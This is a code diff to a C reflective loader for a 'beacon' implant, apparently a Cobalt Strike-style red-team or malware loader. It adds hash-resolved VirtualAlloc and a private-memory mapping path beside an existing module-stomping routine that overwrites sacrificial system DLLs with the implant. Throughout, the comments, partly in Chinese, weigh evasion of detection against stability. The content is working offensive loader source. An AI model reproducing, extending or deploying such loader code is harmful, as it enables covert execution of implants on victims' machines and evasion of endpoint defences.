@@ -110,6 +110,7 @@ typedef struct {
 #define IMG_DIRECTORY_IMPORT   1
 #define IMAGE_REL_BASED_DIR64  10
 
+#define BW_H_VIRTUALALLOC  0x91AFCA54UL
 #define BW_H_LOADLIBRARYA  0xEC0E4E8EUL
 #define BW_H_GETPROCADDR   0x7C0DFCAAUL
 #define BW_H_VIRTUALPROT   0x7946C61BUL
@@ -120,6 +121,7 @@ typedef struct {
 #define BW_H_FLUSHICACHE   0x53120980UL
 #define BW_H_GETCURPROC    0x7B8F17E6UL
 
+typedef LPVOID  (WINAPI *BW_VALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef HMODULE (WINAPI *BW_LOADLIBA)(LPCSTR);
 typedef FARPROC (WINAPI *BW_GETPROC)(HMODULE, LPCSTR);
 typedef BOOL    (WINAPI *BW_VPROT)(LPVOID, SIZE_T, DWORD, PDWORD);
@@ -391,6 +393,7 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     BW_GETPROC     pGetProcAddress;
     BW_VPROT       pVP;
     BW_VQUERY      pVQ;
+    BW_VALLOC      pVA;
     BW_LOADLIBEXW  pLLW;
     BW_FREELIB     pFL;
     BW_EXITTHR     pET;
@@ -423,6 +426,7 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     if (kern == 0)
         return 0;
 
+    pVA             = (BW_VALLOC)    bw_find_export_hash((void *)kern, BW_H_VIRTUALALLOC);
     pVQ             = (BW_VQUERY)    bw_find_export_hash((void *)kern, BW_H_VIRTUALQUERY);
     if (pVQ == NULL)
         return 0;
@@ -488,6 +492,21 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
      * overlay) stays PAGE_READWRITE - BEX64 DEP at 0x1d29d8 on the last
      * dump. AceLdr copies the implant at the module base for this reason.
      * Candidates must have SizeOfImage > beacon SizeOfImage. */
+#ifdef BW_LOADER_PRIVATE
+    /* 定向重写（llvm 线）：私有内存映射取代模块 stomp。
+     *
+     * stomp 把 beacon 寄生在一个系统映射的模块上，而该映射不属于我们：
+     * 实测（llvm 分支附录 C/D）spwizimg 中途被系统 unmap，stomp 页被还原，
+     * 崩溃点漂移且寄存器被资源页数据污染。私有 VirtualAlloc 没有所有者、
+     * 永不被动卸载——以 unbacked 内存的检测面换取确定性，是 LLVM 线的
+     * 正确基线；模块 back 的隐蔽形态待检测面专项再回来做。
+     * 同步删除：候选枚举、页保护翻转（私有页天生 RW）、失败 FreeLibrary。 */
+    sc_base = (unsigned char *)pVA(NULL, size_of_image,
+                                   MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    if (sc_base == NULL || sc_base == flat)
+        return 0;
+    sc_span = size_of_image;
+#else
     for (k = 0; k < 4; k++) {
         unsigned short wname[28];
         QWORD * wq = (QWORD *)wname;
@@ -499,34 +518,21 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
         DWORD cand_soi;
 
         wq[0] = 0; wq[1] = 0; wq[2] = 0; wq[3] = 0;
-        /* Guard CF (IMAGE_DLLCHARACTERISTICS_GUARD_CF = 0x4000) is fatal
-         * here: ntdll still holds the sacrificial module's original CFG
-         * bitmap, so the indirect call to our DllMain is rejected and the
-         * dispatch lands in leftover original code (BEX64 at
-         * xpsservices+0x1cfa89 on the previous dump). Candidates below
-         * have SizeOfImage > beacon and dllchar without 0x4000. */
-        if (k == 0) {        /* spwizimg.dll     SizeOfImage 0x598000, nocfg */
+        if (k == 0) {        /* spwizimg.dll */
             wq[0] = 0x0069007700700073ULL; wq[1] = 0x0067006D0069007AULL;
             wq[2] = 0x006C006C0064002EULL; wq[3] = 0x0000000000000000ULL;
-        } else if (k == 1) { /* shellstyle.dll   SizeOfImage 0x11c000, nocfg */
+        } else if (k == 1) { /* shellstyle.dll */
             wq[0] = 0x006C006500680073ULL; wq[1] = 0x007900740073006CULL;
             wq[2] = 0x0064002E0065006CULL; wq[3] = 0x00000000006C006CULL;
-        } else if (k == 2) { /* msvcr100.dll     SizeOfImage 0x0d2000, nocfg */
+        } else if (k == 2) { /* msvcr100.dll */
             wq[0] = 0x006300760073006DULL; wq[1] = 0x0030003000310072ULL;
             wq[2] = 0x006C006C0064002EULL; wq[3] = 0x0000000000000000ULL;
-        } else {             /* UIRibbonRes.dll  SizeOfImage 0x0ce000, nocfg */
+        } else {             /* UIRibbonRes.dll */
             wq[0] = 0x0069005200490055ULL; wq[1] = 0x006E006F00620062ULL;
             wq[2] = 0x002E007300650052ULL; wq[3] = 0x0000006C006C0064ULL;
         }
         wname[27] = 0;
 
-        /* 2026-10-26: DONT_RESOLVE_DLL_REFERENCES is documented as unsafe
-         * ("the system may unload the module") - live cdb debugging caught
-         * spwizimg being ZwUnmapViewOfSection'd mid-run while the beacon
-         * executed from its pages (llvm branch appendix C/D). The primary
-         * candidate has no entry point and no imports, and the fallbacks
-         * are benign, so a fully-resolved, properly-referenced mapping
-         * costs nothing and can never be spuriously unloaded. */
         h = pLLW(wname, NULL, 0);
         if (h == NULL)
             continue;
@@ -559,9 +565,7 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     if (sc_base == NULL || sc_base == flat)
         return 0;
 
-    /* Flip every committed page covering [base, base+SizeOfImage) to RW.
-     * VirtualProtect on a span larger than one region fails silently and
-     * leaves the original RX/R/RW mix, so walk with VirtualQuery. */
+    /* Flip every committed page covering [base, base+SizeOfImage) to RW. */
     {
         unsigned char * p = sc_base;
         unsigned char * end = sc_base + size_of_image;
@@ -579,6 +583,7 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
             p += chunk;
         }
     }
+#endif
 
     bw_zero(sc_base, size_of_image);
     bw_copy(sc_base, flat, opt->SizeOfHeaders);
